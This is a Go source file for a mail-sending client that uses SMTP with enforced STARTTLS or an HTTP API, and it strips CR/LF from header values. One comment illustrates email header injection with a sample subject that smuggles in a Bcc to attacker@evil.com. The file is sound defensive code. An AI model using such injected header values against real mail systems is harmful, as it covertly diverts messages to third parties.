package dispatcher

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/smtp"
	"net/textproto"
	"net/url"
	"strconv"
	"strings"

	"github.com/nauticana/keel/common"
	"github.com/nauticana/keel/secret"
)

type MailClient struct {
	Secrets secret.SecretProvider
}

func (m *MailClient) SendEmail(ctx context.Context, subject string, body string, recipients []string) error {
	switch *common.MailMode {
	case "api":
		return m.sendViaAPI(ctx, subject, body, recipients)
	default:
		return m.sendViaSMTP(ctx, subject, body, recipients)
	}
}

func (m *MailClient) SendEmailHTML(ctx context.Context, subject string, htmlBody string, recipients []string, attachmentName string, attachmentData []byte) error {
	switch *common.MailMode {
	case "api":
		return m.sendHTMLViaAPI(ctx, subject, htmlBody, recipients)
	default:
		return m.sendHTMLViaSMTP(ctx, subject, htmlBody, recipients, attachmentName, attachmentData)
	}
}

// --- SMTP mode (default) ---

// scrubMailHeader strips CR/LF (and stray null bytes) from a value
// destined for an RFC 5322 header. A subject like
// "Hi\r\nBcc: attacker@evil.com" would otherwise inject a real Bcc
// header into the message and silently exfiltrate the body to a
// third party. The same hazard applies to From and any recipient.
//
// We also bound length at 998 bytes (the RFC 5322 line-length cap) to
// stop a caller-controlled value from blowing past the SMTP line
// limit and getting the message rejected mid-stream.
func scrubMailHeader(v string) string {
	v = strings.NewReplacer("\r", "", "\n", "", "\x00", "").Replace(v)
	if len(v) > 998 {
		v = v[:998]
	}
	return v
}

// scrubRecipients applies scrubMailHeader to every recipient and drops
// any entry that ends up empty after scrubbing. A caller-supplied
// recipient list with embedded CRLF would otherwise inject extra
// headers via the To: line below.
func scrubRecipients(in []string) []string {
	out := make([]string, 0, len(in))
	for _, r := range in {
		clean := scrubMailHeader(r)
		if clean != "" {
			out = append(out, clean)
		}
	}
	return out
}

func (m *MailClient) sendViaSMTP(ctx context.Context, subject string, body string, recipients []string) error {
	if len(recipients) == 0 {
		return fmt.Errorf("smtp: no recipients")
	}
	smtpPass, err := m.Secrets.GetSecret(ctx, "smtp_pass")
	if err != nil {
		return fmt.Errorf("failed to get SMTP password: %w", err)
	}
	from := scrubMailHeader(*common.SmtpFrom)
	host := *common.SmtpHost
	port := *common.SmtpPort
	addr := host + ":" + strconv.Itoa(port)

	cleanRcpts := scrubRecipients(recipients)
	if len(cleanRcpts) == 0 {
		return fmt.Errorf("smtp: no valid recipients")
	}
	cleanSubject := scrubMailHeader(subject)
	// Header values are scrubbed; the body is left intact (CRLF inside
	// the body is part of the RFC 5322 wire format and must NOT be
	// stripped) but separated from the headers by an explicit blank
	// line. SMTP envelope recipients use cleanRcpts so spoofed RCPT TO
	// values are rejected before the server accepts the message.
	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\n\r\n%s",
		from, strings.Join(cleanRcpts, ", "), cleanSubject, body)
	pass := strings.TrimSpace(smtpPass)
	return sendSMTPWithStartTLS(addr, host, *common.SmtpUser, pass, from, cleanRcpts, []byte(msg))
}

// sendSMTPWithStartTLS dials the server, opportunistically upgrades
// to TLS via STARTTLS, and FAILS if the server doesn't advertise it
// (P1-61). The previous code path used smtp.SendMail, which uses
// STARTTLS when available but happily falls back to plaintext —
// against a misconfigured / hostile server, that meant PlainAuth
// credentials could leak.
//
// Submission ports (587, 465) always require TLS in any modern
// deployment; port 25 between MTAs sometimes doesn't. Keel is a
// MUA-style sender, so we hold the strict line.
func sendSMTPWithStartTLS(addr, host, user, pass, from string, recipients []string, msg []byte) error {
	c, err := smtp.Dial(addr)
	if err != nil {
		return fmt.Errorf("smtp: dial %s: %w", addr, err)
	}
	defer c.Close()

	if err := c.Hello("localhost"); err != nil {
		return fmt.Errorf("smtp: HELO: %w", err)
	}
	if ok, _ := c.Extension("STARTTLS"); !ok {
		return fmt.Errorf("smtp: server %s does not advertise STARTTLS — refusing to send credentials in cleartext", host)
	}
	if err := c.StartTLS(&tls.Config{ServerName: host}); err != nil {
		return fmt.Errorf("smtp: STARTTLS: %w", err)
	}
	auth := smtp.PlainAuth("", user, pass, host)
	if err := c.Auth(auth); err != nil {
		return fmt.Errorf("smtp: auth: %w", err)
	}
	if err := c.Mail(from); err != nil {
		return fmt.Errorf("smtp: MAIL FROM: %w", err)
	}
	for _, r := range recipients {
		if err := c.Rcpt(r); err != nil {
			return fmt.Errorf("smtp: RCPT TO %s: %w", r, err)
		}
	}
	w, err := c.Data()
	if err != nil {
		return fmt.Errorf("smtp: DATA: %w", err)
	}
	if _, err := w.Write(msg); err != nil {
		return fmt.Errorf("smtp: write body: %w", err)
	}
	if err := w.Close(); err != nil {
		return fmt.Errorf("smtp: close body: %w", err)
	}
	return c.Quit()
}

func (m *MailClient) sendHTMLViaSMTP(ctx context.Context, subject string, htmlBody string, recipients []string, attachmentName string, attachmentData []byte) error {
	if len(recipients) == 0 {
		return fmt.Errorf("smtp: no recipients")
	}
	smtpPass, err := m.Secrets.GetSecret(ctx, "smtp_pass")
	if err != nil {
		return fmt.Errorf("failed to get SMTP password: %w", err)
	}
	from := scrubMailHeader(*common.SmtpFrom)
	host := *common.SmtpHost
	port := *common.SmtpPort
	addr := host + ":" + strconv.Itoa(port)

	cleanRcpts := scrubRecipients(recipients)
	if len(cleanRcpts) == 0 {
		return fmt.Errorf("smtp: no valid recipients")
	}
	cleanSubject := scrubMailHeader(subject)
	cleanAttachmentName := scrubMailHeader(attachmentName)

	// Two-buffer assembly (P2-17): write the RFC 5322 headers into
	// `headers`, write the multipart body parts (which carry their
	// own boundary delimiters) into `body`, then concatenate. The
	// previous implementation constructed a multipart.Writer against
	// a buffer it then immediately Reset'd — relying on the writer
	// having captured its boundary string before the Reset wiped its
	// internal state. That worked, but only by accident; this
	// version keeps the writer pointed at a clean buffer the entire
	// time.
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	boundary := writer.Boundary()

	htmlHeader := make(textproto.MIMEHeader)
	htmlHeader.Set("Content-Type", "text/html; charset=UTF-8")
	htmlPart, err := writer.CreatePart(htmlHeader)
	if err != nil {
		return fmt.Errorf("failed to create html part: %w", err)
	}
	htmlPart.Write([]byte(htmlBody))

	if len(attachmentData) > 0 && cleanAttachmentName != "" {
		attHeader := make(textproto.MIMEHeader)
		attHeader.Set("Content-Type", "application/pdf")
		attHeader.Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", cleanAttachmentName))
		attHeader.Set("Content-Transfer-Encoding", "base64")
		attPart, err := writer.CreatePart(attHeader)
		if err != nil {
			return fmt.Errorf("failed to create attachment part: %w", err)
		}
		encoded := base64.StdEncoding.EncodeToString(attachmentData)
		for i := 0; i < len(encoded); i += 76 {
			end := i + 76
			if end > len(encoded) {
				end = len(encoded)
			}
			attPart.Write([]byte(encoded[i:end] + "\r\n"))
		}
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to finalize multipart body: %w", err)
	}

	var headers bytes.Buffer
	fmt.Fprintf(&headers, "From: %s\r\n", from)
	fmt.Fprintf(&headers, "To: %s\r\n", strings.Join(cleanRcpts, ", "))
	fmt.Fprintf(&headers, "Subject: %s\r\n", cleanSubject)
	fmt.Fprintf(&headers, "MIME-Version: 1.0\r\n")
	fmt.Fprintf(&headers, "Content-Type: multipart/mixed; boundary=%s\r\n\r\n", boundary)

	msg := append(headers.Bytes(), body.Bytes()...)
	pass := strings.TrimSpace(smtpPass)
	return sendSMTPWithStartTLS(addr, host, *common.SmtpUser, pass, from, cleanRcpts, msg)
}

// --- API mode ---

func (m *MailClient) sendViaAPI(ctx context.Context, subject string, body string, recipients []string) error {
	return m.postMailAPI(ctx, subject, body, recipients)
}

func (m *MailClient) sendHTMLViaAPI(ctx context.Context, subject string, htmlBody string, recipients []string) error {
	return m.postMailAPI(ctx, subject, htmlBody, recipients)
}

// postMailAPI delivers a message to keel's REST API.
//   - Validates that --smtp_host is a bare host (no scheme, no
//     path), then constructs the URL via net/url so an operator
//     copy-paste like `https://mail.example.com/api` doesn't
//     produce `https://https://mail.example.com/api/api/send`.
//   - Drains the response body on non-2xx so the connection is released to the keep-alive pool.
//   - Routes through common.HTTPClient() — the process-wide client
//     with a 30s timeout — instead of constructing a one-shot.
func (m *MailClient) postMailAPI(ctx context.Context, subject string, body string, recipients []string) error {
	apiKey, err := m.Secrets.GetSecret(ctx, "smtp_pass")
	if err != nil {
		return fmt.Errorf("failed to get mail API key: %w", err)
	}
	host := strings.TrimSpace(*common.SmtpHost)
	if host == "" {
		return fmt.Errorf("smtp_host not configured")
	}
	if strings.Contains(host, "/") || strings.Contains(host, ":") {
		return fmt.Errorf("mail api: --smtp_host must be a bare host (no scheme or path), got %q", host)
	}
	endpoint := (&url.URL{Scheme: "https", Host: host, Path: "/api/send"}).String()

	payload, err := json.Marshal(map[string]interface{}{
		"from":    *common.SmtpFrom,
		"to":      recipients,
		"subject": subject,
		"body":    body,
	})
	if err != nil {
		return fmt.Errorf("failed to marshal email payload: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("failed to create mail request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+strings.TrimSpace(apiKey))
	req.Header.Set("Content-Type", "application/json")

	resp, err := common.HTTPClient().Do(req)
	if err != nil {
		return fmt.Errorf("failed to send email via API: %w", err)
	}
	defer func() {
		_, _ = io.Copy(io.Discard, resp.Body)
		_ = resp.Body.Close()
	}()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("mail API returned status %d", resp.StatusCode)
	}
	return nil
}
